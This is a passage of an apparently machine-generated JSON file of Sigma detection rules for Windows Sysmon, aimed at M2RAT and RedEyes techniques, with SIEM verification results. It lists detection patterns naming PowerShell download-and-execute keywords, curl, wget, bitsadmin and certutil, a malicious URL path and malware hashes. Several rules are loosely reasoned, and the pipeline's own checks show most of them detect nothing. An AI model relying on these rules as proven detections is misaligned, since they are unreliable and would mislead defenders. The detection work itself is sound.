        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "status": "success",
        "rule": {
          "title": "Suspicious PowerShell Execution with Encoded Commands",
          "description": "Detects PowerShell processes that are executed with potentially malicious flags such as encoded commands or web request invocations, which are commonly used by attackers for execution of payloads. Includes detection of PowerShell being launched from a command shell (cmd.exe) which may indicate script-based abuse.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-EncodedCommand",
                "Invoke-Expression",
                "IEX",
                "Invoke-WebRequest",
                "DownloadFile"
              ]
            },
            "selection_parent": {
              "ParentImage|endswith": "\\cmd.exe",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection or selection_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts run via PowerShell",
            "System maintenance tasks that use PowerShell with encoded commands for obfuscation",
            "Automation tools (e.g., SCCM, Ansible, PowerShell Desired State Configuration) that invoke PowerShell with flags like -EncodedCommand",
            "Security or monitoring solutions that spawn PowerShell for data collection"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1059.001"
          ],
          "ttp_id": "unknown",
          "technique_name": "PowerShell",
          "generation_method": "langchain",
          "id": "595a57b1-134d-4513-b363-298743bec018",
          "siem_verification": {
            "rule_id": "595a57b1-134d-4513-b363-298743bec018",
            "attack_id": "2c062f7b-0b06-4569-b547-ab4202b71fa3",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 632.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Detect CMD Execution via Shared Memory",
          "description": "Detects the execution of cmd.exe where the command line indicates usage of shared memory, which may be used for remote control commands.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_shmem": {
              "CommandLine|contains": "shared"
            },
            "condition": "selection_cmd and selection_shmem"
          },
          "falsepositives": [
            "Legitimate administrative scripts that invoke cmd.exe with the word \"shared\" in comments or parameters",
            "System maintenance tasks or scheduled jobs that use cmd.exe and reference shared resources",
            "Debugging or development tools that launch cmd.exe with shared memory flags"
          ],
          "level": "critical",
          "tags": [
            "attack.execution",
            "attack.t1059"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "703c2d55-5de9-4893-977f-696bdc567108",
          "siem_verification": {
            "rule_id": "703c2d55-5de9-4893-977f-696bdc567108",
            "attack_id": "631fa47c-bcb9-424d-9ffe-67c007061a01",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 571.0000000000001,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Trojan",
        "status": "success",
        "rule": {
          "title": "Execution of Known Trojan Binary by Hash",
          "description": "Detects execution of a process whose image or command line contains the known malicious hash 7bab405fbc6af65680443ae95c30595d, indicative of Trojan/Win.Loader.C5359534 activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_image": {
              "Image|contains": "7bab405fbc6af65680443ae95c30595d"
            },
            "selection_cmd": {
              "CommandLine|contains": "7bab405fbc6af65680443ae95c30595d"
            },
            "condition": "selection_image or selection_cmd"
          },
          "falsepositives": [
            "Legitimate internal tools that embed the same hash string in their file name or command line for versioning or logging purposes",
            "Custom deployment scripts that reference the hash for verification"
          ],
          "level": "critical",
          "tags": [
            "attack.t1059",
            "attack.execution",
            "custom.trojan"
          ],
          "ttp_id": "unknown",
          "technique_name": "Trojan",
          "generation_method": "langchain",
          "id": "ca323d94-ab85-45a5-924e-016f3b318f29",
          "siem_verification": {
            "rule_id": "ca323d94-ab85-45a5-924e-016f3b318f29",
            "attack_id": "d9da5b4d-f3c3-46ca-b714-5245cc736b68",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 433.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Downloader",
        "status": "success",
        "rule": {
          "title": "Downloader Detected via Known Malicious Hash and Download Commands",
          "description": "Detects execution of processes that either contain a known malicious downloader hash or exhibit typical download command patterns (PowerShell, wget, curl) indicative of Command and Control activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_hash": {
              "Hashes|contains": "9083c1ff01ad8fabbcd8af1b63b77e66"
            },
            "selection_ps_download": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                "Invoke-WebRequest",
                "IEX",
                "DownloadString"
              ]
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": "http"
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": "http"
            },
            "condition": "selection_hash or selection_ps_download or selection_wget or selection_curl"
          },
          "falsepositives": [
            "Legitimate software installers or update mechanisms that download files using PowerShell, wget or curl.",
            "System administration scripts that retrieve resources from internal repositories.",
            "Security tools that perform automated fetching of signatures or definitions."
          ],
          "level": "high",
          "tags": [
            "attack.t1105",
            "attack.command_and_control",
            "custom.downloader",
            "custom.malware"
          ],
          "ttp_id": "unknown",
          "technique_name": "Downloader",
          "generation_method": "langchain",
          "id": "212f042c-98b5-4d67-8826-b2304fa736c9",
          "siem_verification": {
            "rule_id": "212f042c-98b5-4d67-8826-b2304fa736c9",
            "attack_id": "2392bf24-5534-4b5a-b5e4-f06345c5e326",
            "detected": true,
            "events_found": 2,
            "historical_events": 0,
            "query_time_ms": 525.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "status": "success",
        "rule": {
          "title": "Detect Base64 Encoded Commands Execution",
          "description": "Detects execution of commands that contain Base64 encoded payloads, which is a common technique for data encoding used for defense evasion. The rule looks for PowerShell, CertUtil, and cmd.exe processes invoking Base64 encoding flags or containing Base64 strings in the command line.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                "-enc"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "base64"
            },
            "condition": "selection_powershell or selection_certutil or selection_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment",
            "Software installers or update mechanisms that encode data with certutil",
            "System administrators using cmd.exe to encode/decode files with base64 for legitimate purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.t1027",
            "attack.defense_evasion",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encoding",
          "generation_method": "langchain",
          "id": "5f166ada-3d3e-4ab2-a05d-029445163385",
          "siem_verification": {
            "rule_id": "5f166ada-3d3e-4ab2-a05d-029445163385",
            "attack_id": "228ea25a-3ca1-47b8-bf47-4d51e5f80d31",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 482.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "status": "success",
        "rule": {
          "title": "Base64 Encoding of Command Output Detected",
          "description": "Detects processes that encode data using Base64 before exfiltration, such as certutil, PowerShell with -EncodedCommand/-enc, or cmd.exe invoking base64 utilities. This behavior aligns with the ATT&CK Data Encoding technique (T1132) used for exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode",
                "base64"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                "-enc"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "base64"
            },
            "condition": "selection_certutil or selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate use of certutil.exe for certificate management (e.g., encoding/decoding certificates).",
            "PowerShell scripts that intentionally use -EncodedCommand for obfuscation in internal automation.",
            "Administrators running cmd.exe with base64 utilities for legitimate data processing or testing."
          ],
          "level": "high",
          "tags": [
            "attack.t1132",
            "custom.exfiltration",
            "custom.data-encoding"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encoding",
          "generation_method": "langchain",
          "id": "a552c666-5488-4930-b586-6b6291ae5e06",
          "siem_verification": {
            "rule_id": "a552c666-5488-4930-b586-6b6291ae5e06",
            "attack_id": "3c8a5c98-fc6c-4f5e-a616-930f24d84b4e",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 488.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Download Malware-Tools",
        "status": "success",
        "rule": {
          "title": "Download of JPEG Malware Tool from Suspicious URL",
          "description": "Detects processes that download a JPEG file from a known malicious URL, indicating potential malware tool download (Defense Evasion).",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "elearning.or.kr/popup/handle/1.html",
                ".jpg"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "elearning.or.kr/popup/handle/1.html",
                ".jpg"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "elearning.or.kr/popup/handle/1.html",
                ".jpg"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "elearning.or.kr/popup/handle/1.html",
                ".jpg"
              ]
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": [
                "elearning.or.kr/popup/handle/1.html",
                ".jpg"
              ]
            },
            "condition": "selection_powershell or selection_cmd or selection_bitsadmin or selection_certutil or selection_curl"
          },
          "falsepositives": [
            "Legitimate use of PowerShell to download scripts or updates",
            "System administrators using cmd.exe or bitsadmin.exe for software deployment",
            "Certutil used for certificate retrieval or decoding legitimate files",
            "Curl used for authorized file downloads"
          ],
          "level": "high",
          "tags": [
            "attack.t1105",
            "custom.defense_evasion",
            "custom.download",
            "custom.malware",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Download Malware-Tools",
          "generation_method": "langchain",
          "id": "9155e402-7b41-452f-8331-4967c14d7a39",
          "siem_verification": {
            "rule_id": "9155e402-7b41-452f-8331-4967c14d7a39",
            "attack_id": "ed68c56a-8732-453a-9d04-d8226768b649",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 453.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Exfiltration",
        "status": "success",
        "rule": {
          "title": "Potential Keylogging or Screenshot Data Exfiltration",
          "description": "Detects processes that appear to capture keylogging data or screenshots and may exfiltrate them using common Windows utilities. This rule targets command-line invocations that contain indicators of keylogging or screenshot collection, as well as known exfiltration tools such as certutil and bitsadmin.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_keylog": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "keylog"
            },
            "selection_screenshot": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "screenshot"
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "http"
            },
            "condition": "selection_keylog or selection_screenshot or selection_certutil or selection_bitsadmin"
          },
          "falsepositives": [
            "Legitimate administrative scripts that generate log files named 'keylog' for debugging purposes",
            "Authorized screenshot utilities (e.g., SnippingTool.exe, Greenshot) invoked via PowerShell",
            "System maintenance tools using certutil for certificate management",
            "Bitsadmin used by IT for legitimate file transfers"
          ],
          "level": "high",
          "tags": [
            "attack.t1041",
            "attack.t1567",
            "custom.exfiltration",
            "custom.windows",
            "custom.sysmon",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Exfiltration",
          "generation_method": "langchain",
          "id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
          "siem_verification": {
            "rule_id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
            "attack_id": "55a1df9b-ba14-459b-83f8-dfe877a9a948",
            "detected": true,
            "events_found": 6,
            "historical_events": 0,
            "query_time_ms": 431.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tools",
        "status": "success",
        "rule": {
          "title": "M2RAT Remote Command Execution via cmd.exe",
          "description": "Detects execution of cmd.exe processes that are launched by the M2RAT remote access tool or contain references to M2RAT in their command line, indicating potential remote command execution by the threat actor.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_m2rat": {
              "ParentImage|endswith": "\\M2RAT.exe",
              "Image|endswith": "\\cmd.exe"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "M2RAT"
            },
            "condition": "selection_m2rat or selection_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts or batch files executed via cmd.exe",
            "Scheduled tasks or system maintenance utilities that invoke cmd.exe",
            "Software installers or update mechanisms that spawn cmd.exe for configuration"
          ],
          "level": "critical",
          "tags": [
            "attack.t1219",
            "attack.command_and_control",
            "custom.m2rat"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Access Tools",
          "generation_method": "langchain",
          "id": "79bbd622-9549-446b-8610-72134a8cf991",
          "siem_verification": {
            "rule_id": "79bbd622-9549-446b-8610-72134a8cf991",
            "attack_id": "d820280e-f5ee-42ef-ac29-1b12db501a6f",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 503.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Vulnerability",
        "status": "success",
        "rule": {
          "title": "Exploitation of HWP EPS Vulnerability (CVE-2017-8291)",
          "description": "Detects execution of processes that interact with malicious HWP files or reference CVE-2017-8291, indicating exploitation of the HWP EPS vulnerability used by the RedEyes group for initial access.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_hwp": {
              "Image|endswith": "\\hwp.exe",
              "CommandLine|contains": ".hwp"
            },
            "selection_winword": {
              "Image|endswith": "\\winword.exe",
              "CommandLine|contains": "Form.hwp"
            },
            "selection_cve": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "CVE-2017-8291"
            },
            "condition": "selection_hwp or selection_winword or selection_cve"
          },
          "falsepositives": [
            "Legitimate opening of .hwp documents by users using Hancom Office (hwp.exe).",
            "Administrative scripts that process .hwp files for conversion or batch operations.",
            "Users opening .hwp files with Microsoft Word (winword.exe) for compatibility purposes."
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.t1190",
            "attack.exploitation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploitation of Vulnerability",
          "generation_method": "langchain",
          "id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
          "siem_verification": {
            "rule_id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
            "attack_id": "4a10ce36-1bf6-4332-acbf-ada08ecccea9",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 440.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Execution of Suspicious Executable from Temp Directory (lskdjfel.exe)",
          "description": "Detect creation of the executable lskdjfel.exe in the temporary directory, indicating a possible persistence technique where a new system process is introduced.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_name": {
              "Image|endswith": "\\lskdjfel.exe"
            },
            "selection_path": {
              "Image|contains": "\\Temp\\lskdjfel.exe"
            },
            "selection_cmd": {
              "CommandLine|contains": "lskdjfel.exe"
            },
            "condition": "selection_name or selection_path or selection_cmd"
          },
          "falsepositives": [
            "Legitimate installers or updaters that extract temporary executables to the %TEMP% folder",
            "Antivirus or endpoint protection tools that stage temporary files for scanning",
            "User\u2011initiated scripts or utilities that run from the temp directory (e.g., batch files, PowerShell scripts)",
            "Software that unpacks components to %TEMP% before execution (e.g., MSI packages, zip extractors)"
          ],
          "level": "high",
          "tags": [
            "attack.t1543",
            "attack.persistence",
            "custom.windows",
            "custom.sysmon",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
          "siem_verification": {
            "rule_id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
            "attack_id": "9ee52664-0c4a-4393-93b1-251eeaa32ea4",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 479.00000000000006,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via RAR with Password Protection",
          "description": "Detects execution of rar.exe with password protection flags (-hp) and compression level (-m1), indicating archiving of collected data for exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rar": {
              "Image|endswith": "\\rar.exe"
            },
            "selection_hp": {
              "CommandLine|contains": "-hp"
            },
            "selection_m1": {
              "CommandLine|contains": "-m1"
            },
            "condition": "selection_rar and selection_hp and selection_m1"
          },
          "falsepositives": [
            "Legitimate use of WinRAR for creating backups or packaging files",
            "System administrators compressing logs or data for archival purposes",
            "Software installers that bundle resources using rar.exe"
          ],
          "level": "high",
          "tags": [
            "attack.t1560.001",
            "attack.exfiltration",
            "custom.rar",
            "custom.windows",
            "custom.process_creation",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
          "siem_verification": {
            "rule_id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
            "attack_id": "f8ae7cb2-d948-4815-ba3d-161099f23f51",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 422.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over Alternative Protocol via Encoded MAC Address Indicators",
          "description": "Detects processes that include suspicious encoded MAC address values or result_ patterns in command line arguments, indicating potential data exfiltration over non\u2011standard protocols.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "result_",
                "_Encoded MAC Address Value_cap",
                "_Encoded MAC Address Value_2"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "result_",
                "_Encoded MAC Address Value_cap",
                "_Encoded MAC Address Value_2"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "result_",
                "_Encoded MAC Address Value_cap",
                "_Encoded MAC Address Value_2"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil"
          },
          "falsepositives": [
            "Legitimate administrative scripts that generate temporary files named with a 'result_' prefix.",
            "Network configuration or inventory tools that output encoded MAC address values for documentation purposes.",
            "System utilities (e.g., certutil) used by IT staff for certificate handling that may include encoded MAC address strings."
          ],
          "level": "high",
          "tags": [
            "attack.tactic.exfiltration",
            "attack.technique.T1048",
            "custom.exfiltration",
            "custom.command-line"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over Alternative Protocol",
          "generation_method": "langchain",
          "id": "01414447-c055-450d-a708-d96255dbdd5f",
          "siem_verification": {
            "rule_id": "01414447-c055-450d-a708-d96255dbdd5f",
            "attack_id": "7c3e72f3-3c5e-431a-b304-fd37509867a6",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 410.00000000000006,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Suspicious Child Processes Spawned by explorer.exe (Process Injection)",
          "description": "Detects potential process injection activity where explorer.exe spawns uncommon child processes such as PowerShell, cmd.exe, wmic.exe, or rundll32.exe. This behavior is indicative of the M2RAT backdoor being injected into explorer.exe for defense evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\powershell.exe"
            },
            "selection_cmd": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\cmd.exe"
            },
            "selection_wmic": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\wmic.exe"
            },
            "selection_rundll32": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\rundll32.exe"
            },
            "condition": "selection_powershell or selection_cmd or selection_wmic or selection_rundll32"
          },
          "falsepositives": [
            "Legitimate administrative scripts or automation tools that launch PowerShell, cmd.exe, wmic.exe, or rundll32.exe from Explorer (e.g., Windows Explorer context menu actions).",
            "User-initiated actions where Explorer opens a command prompt or PowerShell window via the Start menu or Run dialog."
          ],
          "level": "high",
          "tags": [
            "attack.t1055",
            "attack.defense_evasion",
            "custom.process_injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
          "siem_verification": {
            "rule_id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
            "attack_id": "5d377c0e-cdb9-4b24-9a11-da0a5f5d2773",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 515.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "status": "success",
        "rule": {
          "title": "Process Hollowing via Explorer.exe with M2RAT Payload",
          "description": "Detects potential process hollowing where a malicious payload (M2RAT) is injected into explorer.exe, indicating a Defense Evasion technique.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_explorer": {
              "Image|endswith": "\\explorer.exe"
            },
            "selection_m2rat": {
              "CommandLine|contains": "M2RAT"
            },
            "condition": "selection_explorer and selection_m2rat"
          },
          "falsepositives": [
            "Legitimate use of explorer.exe with command\u2011line arguments (rare but possible in custom scripts or administrative tools)",
            "Security or forensic tools that launch explorer.exe with specific parameters for analysis"
          ],
          "level": "high",
          "tags": [
            "attack.t1055",
            "attack.defense_evasion",
            "custom.process_hollowing",
            "explorer.exe",
            "custom.M2RAT"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Hollowing",
          "generation_method": "langchain",
          "id": "17a00425-c245-4124-ac67-efae97aaf5df",
          "siem_verification": {
            "rule_id": "17a00425-c245-4124-ac67-efae97aaf5df",
            "attack_id": "0240c927-2289-41b6-8182-92b5c9781cd8",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 432.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Server Software",
        "status": "success",
        "rule": {
          "title": "M2RAT Command Execution via Parent Process",
          "description": "Detects command-line interpreters (cmd.exe or powershell.exe) launched by the M2RAT malware, indicating a threat actor's server transmitting commands to the RAT for command and control.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "ParentImage|contains": "M2RAT"
            },
            "selection_ps": {
              "Image|endswith": "\\powershell.exe",
              "ParentImage|contains": "M2RAT"
            },
            "condition": "selection_cmd or selection_ps"
          },
          "falsepositives": [
            "Legitimate administrative scripts that invoke cmd.exe or powershell.exe from custom management tools",
            "Scheduled tasks or automation frameworks that run command-line utilities under a parent process named similarly to M2RAT (e.g., custom deployment tools)",
            "Security testing or red\u2011team exercises using the M2RAT binary for benign purposes"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "custom.m2rat",
            "custom.c2",
            "custom.process_creation",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Server Software",
          "generation_method": "langchain",
          "id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
          "siem_verification": {
            "rule_id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
            "attack_id": "7560c3bf-3dc8-46a9-9ee4-1dec60248a61",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 446.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "status": "success",
        "rule": {
          "title": "Data Staging to %TEMP% Path Detected",
          "description": "Detects processes that create or write files in the %TEMP% directory using a timestamped naming pattern (Y_YYYY_MM_DD_HH_MM_SS), which is indicative of data staging prior to exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "%TEMP%\\Y_"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "%TEMP%\\Y_"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "%TEMP%\\Y_"
            },
            "condition": "selection_powershell or selection_cmd or selection_wmic"
          },
          "falsepositives": [
            "Legitimate installers or update utilities that write temporary files to %TEMP% with timestamped names",
            "Backup or compression tools that stage data in %TEMP% before archiving",
            "Antivirus or security software performing temporary scans and writing files to %TEMP%",
            "User scripts or automation tasks that use %TEMP% for intermediate data storage"
          ],
          "level": "high",
          "tags": [
            "attack.t1074",
            "custom.exfiltration",
            "custom.data_staging",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Staging",
          "generation_method": "langchain",
          "id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
          "siem_verification": {
            "rule_id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
            "attack_id": "6a1befd3-dec9-490e-aa77-9cc513f8cc2a",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 457.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "status": "success",
        "rule": {
          "title": "Application Window Discovery via PhoneDataCp and PhoneDeviceManager",
          "description": "Detects execution of processes associated with Application Window Discovery, specifically the use of PhoneDataCp or PhoneDeviceManager binaries which may be leveraged to enumerate application windows for data exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_phone_data_cp": {
              "Image|contains": "PhoneDataCp"
            },
            "selection_phone_device_manager": {
              "Image|contains": "PhoneDeviceManager"
            },
            "condition": "selection_phone_data_cp or selection_phone_device_manager"
          },
          "falsepositives": [
            "Legitimate internal utilities named PhoneDataCp or PhoneDeviceManager used by IT or support staff",
            "Development or testing tools that include these binaries"
          ],
          "level": "high",
          "tags": [
            "attack.t1010",
            "attack.discovery",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Window Discovery",
          "generation_method": "langchain",
          "id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
          "siem_verification": {
            "rule_id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
            "attack_id": "3cf5cd9b-0612-44cd-bcb6-0b1d8a30f330",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 566.0000000000001,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
        "status": "success",
        "rule": {
          "title": "Input Capture via PhoneDeviceManager and M2RAT",
          "description": "Detects processes that load PhoneDeviceManager.pdb or execute M2RAT, indicating potential input capture on mobile devices.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_pdb": {
